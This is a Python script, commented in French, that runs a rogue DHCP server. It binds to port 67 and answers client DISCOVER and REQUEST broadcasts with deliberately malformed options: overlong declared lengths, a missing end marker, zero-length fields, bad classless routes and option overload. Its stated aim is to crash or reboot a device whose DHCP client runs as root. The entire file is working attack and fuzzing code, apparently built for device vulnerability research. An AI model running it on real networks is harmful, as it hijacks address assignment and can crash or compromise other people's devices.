#!/usr/bin/env python3
"""Faux serveur DHCP : répond avec des OPTIONS MALFORMÉES.
Le client DHCP du device (root) parse ces options. Oracle = crash/reboot."""
import socket, struct, sys, time, threading

MODE = sys.argv[1] if len(sys.argv) > 1 else "len_overflow"
LOG = "/tmp/fakeap/evil_dhcp.log"

def log(m):
    with open(LOG, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), m))

def find_opt(pkt, code):
    i = 240
    while i < len(pkt):
        if pkt[i] == 255: break
        if i+1 >= len(pkt): break
        c, l = pkt[i], pkt[i+1]
        if c == code: return pkt[i+2:i+2+l]
        i += 2 + l
    return None

def build_reply(req, mode):
    xid = req[4:8]
    mac = req[28:34]
    # base : OFFER/ACK minimal
    # BOOTP exact : op/htype/hlen/hops(4) xid(4) secs+flags(4) ciaddr(4)
    #                yiaddr(4) siaddr(4) giaddr(4) chaddr(16) sname(64) file(128) = 236
    hdr = struct.pack("!BBBB", 2, 1, 6, 0) + xid + b"\x00\x00\x00\x00"
    hdr += b"\x00"*4                      # ciaddr
    hdr += socket.inet_aton("192.168.50.180")  # yiaddr (l IP offerte)
    hdr += b"\x00"*4                      # siaddr
    hdr += b"\x00"*4                      # giaddr
    hdr += mac + b"\x00"*10               # chaddr (16)
    hdr += b"\x00"*64 + b"\x00"*128     # sname + file
    hdr += b"\x63\x82\x53\x63"  # magic cookie
    opts = b""
    opts += bytes([53,1,2 if req[242:243]!=b"\x03" else 5])  # OFFER ou ACK
    opts += bytes([1,4]) + socket.inet_aton("192.168.50.1")   # subnet
    opts += bytes([54,4]) + socket.inet_aton("192.168.50.1")  # server id (OBLIGATOIRE)
    opts += bytes([51,4]) + struct.pack("!I", 3600)          # lease time (OBLIGATOIRE)
    opts += bytes([6,4]) + socket.inet_aton("192.168.50.1")   # DNS
    opts += bytes([3,4]) + socket.inet_aton("192.168.50.1")   # router (valide d abord)
    if mode == "valid":
        # offre valide : on ne rajoute AUCUNE option malformee
        opts += bytes([255])
        return hdr + opts
    if mode == "len_overflow":
        # OPTION 3 (router) déclare 200 octets mais n'en fournit que 4
        opts += bytes([3,200]) + socket.inet_aton("192.168.50.1")
    elif mode == "len_max":
        opts += bytes([3,255]) + b"\x41"*20      # 255 déclaré, 20 fournis
    elif mode == "opt_overload":
        opts += bytes([52,1,3])                   # overload: sname+file à parser
        opts += bytes([3,4]) + socket.inet_aton("192.168.50.1")
    elif mode == "route_bad":
        opts += bytes([121,3]) + b"\x18\xc0\xa8\x32"   # CIDR 24 mais 4 octets pour 3 attendus
    elif mode == "huge_concat":
        for _ in range(30):
            opts += bytes([3,4]) + socket.inet_aton("192.168.50.1")
    elif mode == "no_end":
        opts += bytes([3,4]) + socket.inet_aton("192.168.50.1")
        return hdr + opts        # PAS de 0xFF final
    elif mode == "zero_len":
        opts += bytes([3,0])     # longueur 0 sur une option qui en attend 4
    opts += bytes([255])
    return hdr + opts

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
try:
    s.bind(("0.0.0.0", 67))
except PermissionError:
    print("root requis (port 67)"); sys.exit(1)
log("=== evil_dhcp mode=%s ===" % MODE)
while True:
    try:
        data, addr = s.recvfrom(2048)
    except Exception:
        continue
    if len(data) < 240: continue
    m = data[242] if len(data) > 242 else 0
    # trouver le type de message
    i, mtype = 240, None
    while i < len(data):
        if data[i] == 255: break
        if i+1 >= len(data): break
        if data[i] == 53 and data[i+1] == 1:
            mtype = data[i+2]; break
        i += 2 + data[i+1]
    log("reçu type=%s de %s (%d o)" % (mtype, addr[0], len(data)))
    if mtype in (1, 3):     # DISCOVER / REQUEST
        rep = build_reply(data, MODE)
        s.sendto(rep, ("255.255.255.255", 68))
        log("envoyé %s (%d o)" % (MODE, len(rep)))
